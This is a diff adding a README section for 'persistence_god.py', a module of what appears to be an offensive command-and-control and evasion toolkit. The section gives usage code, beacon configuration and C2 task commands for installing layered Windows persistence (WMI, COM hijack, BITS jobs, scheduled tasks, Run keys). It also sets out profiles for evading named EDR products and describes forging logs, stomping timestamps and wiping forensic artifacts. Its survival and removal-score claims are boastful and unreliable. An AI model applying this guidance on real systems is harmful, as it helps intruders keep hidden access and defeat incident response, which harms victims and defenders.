@@ -1033,6 +1033,318 @@ pytest tests/test_process_injection_masterclass.py::TestMultiStageChain -v
 
 ---
 
+#### 🔹 `persistence_god.py` - Ultimate Full Chain Persistence God Mode (ELITE)
+
+The **Persistence God Mode** is the ultimate persistence module, implementing AI-Dynamic persistence chain selection with multi-chain installation, runtime artifact mutation, log forging, timestamp stomping, and forensic artifact wiping. Target: **%96 artifact reduction, EDR removal score → 0, immortal beacon**.
+
+##### Core Capabilities
+
+| Feature | Description | Impact |
+|---------|-------------|--------|
+| **AI-Dynamic Persistence** | AI selects chain based on detected EDR | Defender → Registry muting, SentinelOne → BITS job |
+| **Multi-Chain Persistence** | WMI event → COM hijack → BITS job → Schtask → RunKey | Layered install defeats single-chain detection |
+| **Runtime Mutation** | Mutate registry keys, task names, CLSIDs at install time | Prevents signature-based removal |
+| **Spoof Events (Log Forge)** | Generate fake schtask/registry/file events | Overwhelm forensic timeline |
+| **Timestamp Stomping** | Match artifact timestamps to System32 files | Defeats timeline analysis |
+| **Artifact Wiping** | Clear prefetch, recent, temp, jump lists | Forensic artifact %96 reduction |
+| **Registry Muting** | Briefly mute registry monitoring during write | Bypass registry hooks |
+
+##### Persistence Chains (Stealth Levels 1-10)
+
+| Chain | Stealth | Description | Best For |
+|-------|---------|-------------|----------|
+| `FULL_CHAIN` | 10 | All chains combined - immortal | Maximum resilience |
+| `WMI_EVENT` | 9 | WMI event subscription | Fileless persistence |
+| `COM_HIJACK` | 9 | COM object CLSID hijack | CrowdStrike/Falcon |
+| `BITS_JOB` | 8 | Background transfer job | SentinelOne |
+| `DLL_SEARCH_ORDER` | 8 | DLL search order hijack | Carbon Black |
+| `SCHTASK` | 7 | Scheduled task | No EDR environments |
+| `SERVICE` | 6 | Windows service | Legacy systems |
+| `RUNKEY` | 5 | Registry Run key | Quick persistence |
+| `STARTUP_FOLDER` | 3 | Startup folder shortcut | Basic environments |
+
+##### EDR-Specific Persistence Profiles
+
+| EDR Product | Primary Chain | Avoid | Mutation Rate | Registry Muting |
+|-------------|---------------|-------|---------------|-----------------|
+| CrowdStrike Falcon | COM Hijack | SCHTASK, WMI | 90% | ✅ |
+| SentinelOne | BITS Job | SERVICE, SCHTASK | 90% | ✅ |
+| MS Defender ATP | Registry Run | WMI, SERVICE | 80% | ✅ |
+| Carbon Black | DLL Search Order | WMI, SERVICE | 70% | ❌ |
+| Elastic EDR | BITS Job | WMI | 60% | ✅ |
+| No EDR | Scheduled Task | - | 30% | ❌ |
+
+##### Quick Start
+
+```python
+from evasion.persistence_god import (
+    PersistenceGodMonster, PersistenceChain,
+    create_persistence_god, quick_persist,
+    get_ai_persist_recommendation, detect_edr_for_persist
+)
+
+# Quick persist - AI selects everything
+result = quick_persist(payload_callback="C:\\beacon.exe")
+print(f"Chains installed: {result['chains_installed']}")
+print(f"Artifacts mutated: {len(result['mutated_artifacts'])}")
+print(f"Spoof events: {result['spoofed_events']}")
+print(f"Artifacts wiped: {len(result['artifacts_wiped'])}")
+
+# AI recommendation for current environment
+recommendation = get_ai_persist_recommendation()
+print(f"Detected EDR: {recommendation}")
+```
+
+##### Full Configuration
+
+```python
+from evasion.persistence_god import (
+    PersistenceGodMonster, PersistenceConfig,
+    PersistenceChain, MutationTarget
+)
+
+# Create fully configured persistence god
+config = PersistenceConfig(
+    ai_adaptive=True,           # AI selects chain based on EDR
+    enable_multi_chain=True,    # Install multiple chains
+    enable_spoof_events=True,   # Generate fake events
+    mutation_rate=0.9,          # High artifact mutation
+    use_reg_muting=True,        # Mute registry monitoring
+    timestamp_stomp=True,       # Match System32 timestamps
+    artifact_wipe=True,         # Clear forensic artifacts
+)
+
+god = PersistenceGodMonster(config)
+
+# Full chain persistence
+result = god.persist(
+    payload_callback="C:\\Windows\\Temp\\beacon.exe",
+    use_full_chain=True
+)
+
+if result['success']:
+    print(f"✅ Persistence God Mode SUCCESS")
+    print(f"   Chains: {result['chains_installed']}")
+    print(f"   Mutations: {len(result['mutated_artifacts'])}")
+    print(f"   Spoofed: {result['spoofed_events']} events")
+    print(f"   Wiped: {len(result['artifacts_wiped'])} artifacts")
+    print(f"   Estimated survival: %96")
+else:
+    print(f"❌ Failed: {result['error']}")
+```
+
+##### Beacon Integration
+
+The `evasive_beacon.py` automatically integrates persistence god when configured:
+
+```yaml
+# beacon_config.yaml - Persistence God Section
+persistence_god:
+  enabled: true
+  ai_adaptive: true              # AI selects chain based on EDR
+  primary_chain: ai_select       # or bits_job, com_hijack, etc.
+  
+  multi_chain:
+    enabled: true
+    chains:
+      - bits_job
+      - com_hijack
+      - runkey
+  
+  mutation:
+    enabled: true
+    mutation_rate: 0.8
+    targets:
+      - registry_key
+      - task_name
+      - com_clsid
+  
+  spoof_events:
+    enabled: true
+    spoof_before_install: true
+    spoof_after_install: true
+  
+  timestamp_stomp:
+    enabled: true
+    reference_dir: "C:\\Windows\\System32"
+  
+  artifact_wipe:
+    enabled: true
+    targets:
+      - prefetch
+      - recent
+      - temp
+```
+
+##### C2 Task Commands
+
+```json
+// AI-adaptive persistence
+{
+  "task_type": "persist",
+  "method": "ai_select"
+}
+
+// Full chain immortal persistence
+{
+  "task_type": "persist",
+  "method": "full_chain",
+  "payload_path": "C:\\beacon.exe"
+}
+
+// Specific chain
+{
+  "task_type": "persist",
+  "method": "bits_job",
+  "payload_path": "C:\\beacon.exe"
+}
+```
+
+##### AI Lateral Guide Integration
+
+```python
+from cybermodules.ai_lateral_guide import AILateralGuide
+
+guide = AILateralGuide()
+
+# Get persistence recommendation
+plan = guide.get_persistence_recommendation()
+print(f"Detected EDR: {plan['detected_edr']}")
+print(f"Primary chain: {plan['primary_chain']}")
+print(f"Avoid chains: {plan['avoid_chains']}")
+print(f"Mutation rate: {plan['mutation_rate']}")
+
+# Get scenario-specific recommendation
+scenario = guide.recommend_persistence_for_scenario(
+    scenario="long_term",
+    high_value=True
+)
+print(f"Chains to use: {scenario['chains_to_use']}")
+print(f"Survival score: {scenario['estimated_survival_score']}")
+
+# Create configured persistence god
+god = guide.create_persistence_god(
+    ai_adaptive=True,
+    multi_chain=True,
+    enable_spoof=True
+)
+```
+
+##### Class Reference
+
+| Class | Description |
+|-------|-------------|
+| `PersistenceGodMonster` | Main orchestrator - coordinates all persistence operations |
+| `AIPersistenceSelector` | AI-based chain selection based on EDR detection |
+| `PersistenceChainExecutor` | Executes individual persistence chains |
+| `ArtifactMutator` | Mutates registry keys, task names, CLSIDs |
+| `SpoofEventGenerator` | Generates fake events for log forging |
+| `TimestampStomper` | Modifies timestamps to match System32 |
+| `PersistenceArtifactWiper` | Wipes prefetch, recent, temp artifacts |
+
+##### Persistence Flow Diagram
+
+```
+┌────────────────────────────────────────────────────────────────────┐
+│                    PERSISTENCE GOD MODE FLOW                        │
+└────────────────────────────────────────────────────────────────────┘
+                               │
+                               ▼
+┌─────────────────────────────────────────────────────────────────────┐
+│ 1. EDR DETECTION                                                     │
+│    • Scan process list for EDR signatures                           │
+│    • Identify: Defender, CrowdStrike, SentinelOne, Carbon Black     │
+│    • Select optimal persistence profile                              │
+└─────────────────────────────────────────────────────────────────────┘
+                               │
+                               ▼
+┌─────────────────────────────────────────────────────────────────────┐
+│ 2. PRE-INSTALL SPOOF                                                 │
+│    • Generate fake schtask create/delete events                      │
+│    • Generate fake registry set events                               │
+│    • Generate fake file create events                                │
+│    • Overwhelm forensic timeline with noise                          │
+└─────────────────────────────────────────────────────────────────────┘
+                               │
+                               ▼
+┌─────────────────────────────────────────────────────────────────────┐
+│ 3. ARTIFACT MUTATION                                                 │
+│    • Mutate registry key names (WindowsUpdateService, etc.)         │
+│    • Mutate task names (Microsoft Compatibility Telemetry, etc.)    │
+│    • Mutate COM CLSIDs (generate random valid GUIDs)                │
+│    • Add legitimate-looking prefixes (Windows, Microsoft, System)   │
+└─────────────────────────────────────────────────────────────────────┘
+                               │
+                               ▼
+┌─────────────────────────────────────────────────────────────────────┐
+│ 4. CHAIN INSTALLATION (per EDR profile)                              │
+│    ┌─────────────────────────────────────────────────────────────┐  │
+│    │ Defender: RunKey + BITS (avoid WMI/Service)                 │  │
+│    │ CrowdStrike: COM Hijack + DLL (avoid Schtask/WMI)           │  │
+│    │ SentinelOne: BITS + COM (avoid Service/Schtask)             │  │
+│    │ Carbon Black: DLL Search + COM (avoid WMI/Service)          │  │
+│    │ No EDR: Schtask + RunKey (fast/reliable)                    │  │
+│    └─────────────────────────────────────────────────────────────┘  │
+└─────────────────────────────────────────────────────────────────────┘
+                               │
+                               ▼
+┌─────────────────────────────────────────────────────────────────────┐
+│ 5. TIMESTAMP STOMP                                                   │
+│    • Get reference timestamp from C:\Windows\System32\*.dll         │
+│    • Apply to all created persistence artifacts                      │
+│    • Randomize within 365 day spread for natural distribution       │
+└─────────────────────────────────────────────────────────────────────┘
+                               │
+                               ▼
+┌─────────────────────────────────────────────────────────────────────┐
+│ 6. POST-INSTALL SPOOF                                                │
+│    • Generate more fake events                                       │
+│    • Mix real and fake events in logs                               │
+│    • Timeline analysis → confused                                    │
+└─────────────────────────────────────────────────────────────────────┘
+                               │
+                               ▼
+┌─────────────────────────────────────────────────────────────────────┐
+│ 7. ARTIFACT WIPE                                                     │
+│    • Clear prefetch files                                            │
+│    • Clear recent documents                                          │
+│    • Clear temp directories                                          │
+│    • Clear jump lists                                                │
+│    • Forensic artifact %96 reduction                                 │
+└─────────────────────────────────────────────────────────────────────┘
+                               │
+                               ▼
+┌─────────────────────────────────────────────────────────────────────┐
+│ 8. RESEED MUTATOR                                                    │
+│    • Regenerate mutation seeds                                       │
+│    • Prepare for next operation                                      │
+│    • Prevent EDR re-scan detection                                   │
+└─────────────────────────────────────────────────────────────────────┘
+                               │
+                               ▼
+                    ┌─────────────────────┐
+                    │   IMMORTAL BEACON   │
+                    │   EDR removal: 0    │
+                    │   Survival: %96     │
+                    └─────────────────────┘
+```
+
+##### Testing
+
+```bash
+# Run persistence god tests
+pytest tests/test_persistence_god.py -v
+
+# Test specific components
+pytest tests/test_persistence_god.py::TestAIPersistenceSelector -v
+pytest tests/test_persistence_god.py::TestArtifactMutator -v
+pytest tests/test_persistence_god.py::TestSpoofEventGenerator -v
+pytest tests/test_persistence_god.py::TestTimestampStomper -v
+pytest tests/test_persistence_god.py::TestPersistenceIntegration -v
+```
+
+---
+
 ### 🎯 Evasive Beacon Usage
 
 The `evasive_beacon.py` agent integrates all evasion modules into a full-featured C2 beacon.
